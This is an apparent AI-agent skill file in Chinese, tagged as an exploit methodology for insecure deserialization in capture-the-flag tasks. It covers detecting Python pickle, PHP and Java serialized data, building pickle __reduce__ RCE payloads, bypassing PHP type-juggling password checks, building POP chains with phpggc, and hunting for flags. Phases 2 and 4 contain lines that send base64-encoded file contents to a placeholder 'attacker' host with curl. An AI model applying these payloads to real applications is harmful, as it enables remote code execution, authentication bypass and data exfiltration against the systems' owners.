---
name: deserialization-methodology
description: "不安全反序列化漏洞利用。当发现 Base64 编码的 Cookie/参数、Python pickle 数据、PHP serialized 字符串(O:4:...)、Java serialized 数据(rO0AB...)时使用。可直接获取 RCE"
metadata:
  tags: "insecure_deserialization,deserialization,insecure deserialization,pickle,unserialize,php,java,rce"
  category: "exploit"
---

# 反序列化漏洞方法论

## 深入参考

- Pickle payload 模板库（回显/盲/文件上传/发送方式）→ [references/pickle-payload-templates.md](references/pickle-payload-templates.md)
- RCE 成功但无回显？盲利用外带策略 → [references/blind-exploitation.md](references/blind-exploitation.md)
- PHP 反序列化详解（POP Chain/Type Juggling/phpggc） → [references/php-deserialization.md](references/php-deserialization.md)
- .NET 反序列化利用（ViewState/BinaryFormatter/ysoserial.net） → [references/dotnet-deserialization.md](references/dotnet-deserialization.md)

## Phase 1: 检测反序列化入口

常见位置：Cookie 值、POST Body、Hidden 表单字段（viewstate）、API 参数、文件上传

**格式标识（Magic Bytes）**：

| 格式 | 识别特征 | 下一步 |
|------|----------|--------|
| Python Pickle | Base64 解码后 `\x80` 开头或含 `cos\n`（魔术字节） | → Phase 2 |
| PHP | `O:4:"User":2:{` 或 `a:N:{` 格式 | → Phase 3 |
| Java | Base64 解码后 `\xac\xed\x00\x05`（Magic Bytes）或 Base64 `rO0AB` 开头 | Java 反序列化利用 |

1. 提取所有 Cookie 和隐藏字段的值，尝试 Base64 解码
2. 检查 `Content-Type` 头：`application/x-python-pickle`、`application/x-java-serialized-object`
3. 观察错误信息中是否包含 `pickle`、`unserialize`、`ObjectInputStream` 等关键字
4. 上传 `.pkl`、`.ser` 等序列化文件格式，观察服务端行为
5. 修改序列化数据中的字段值，观察响应变化确认服务端确实反序列化了输入

## Phase 2: Python Pickle RCE

⚠️ **关键约束**：`__reduce__` 只能返回 `(模块级函数, 参数元组)` — `self.method` 会失败

1. 构造基础 RCE payload：使用 `__reduce__` 方法调用 `os.system` 或 `subprocess.check_output`
2. 回显 payload：`subprocess.check_output(['cat', '/flag.txt'])` — 直接在响应中看到结果
3. 无回显 payload：`os.system('cp /flag.txt /app/static/f.txt')` — 写文件到 Web 可访问路径
4. 外带 payload：`os.system('curl http://attacker/?d=$(cat /flag|base64)')` — HTTP 外传数据
5. 序列化并编码：`base64.b64encode(pickle.dumps(payload))` 后替换原始数据发送
6. 注意 Python 版本差异：Python 2/3 的 pickle 协议版本不同，可能需要指定 `protocol=2`

常见触发点：Flask session、Redis session、`Content-Type: application/x-python-pickle`、`.pkl` 文件上传

决策树：回显 payload → 无回显则写文件到 Web 路径 → 仍失败则读盲利用参考
→ 完整模板 → 读 `references/pickle-payload-templates.md`

## Phase 3: PHP 反序列化

1. 识别序列化字符串格式：`O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}`
2. Type Juggling 速查：`b:1`（boolean true）松散比较 `==` 可绕过任意密码验证
3. 修改属性值：直接修改序列化字符串中的字段（注意长度前缀 `s:N:` 要匹配）
4. POP Chain 构造：找到可控属性的类（如 `__destruct` 中调用 `file_put_contents`），通过链式属性控制实现任意文件写入或命令执行
5. phpggc 工具：`phpggc <framework>/<gadget> <type> <arg>` 自动生成常见框架的利用链
6. 常见框架 gadget：Laravel（RCE）、Symfony（文件写入）、WordPress（对象注入）
→ 完整 POP Chain/Type Juggling/phpggc 用法 → 读 `references/php-deserialization.md`

## Phase 4: Flag 获取

1. 反序列化 RCE 成功后优先执行：`cat /flag.txt`、`cat /FLAG.txt`
2. 列目录搜索：`ls /` → `find / -name "*flag*" 2>/dev/null`
3. 环境变量：`env | grep -i flag`
4. 无回显时写到 Web 路径：`cp /flag* /app/static/flag.txt` 然后 HTTP 访问
5. DNS/HTTP 外带：`curl http://attacker/$(cat /flag|base64)`
6. 检查数据库：`cat /app/config*` 获取连接信息后查询 flag 表
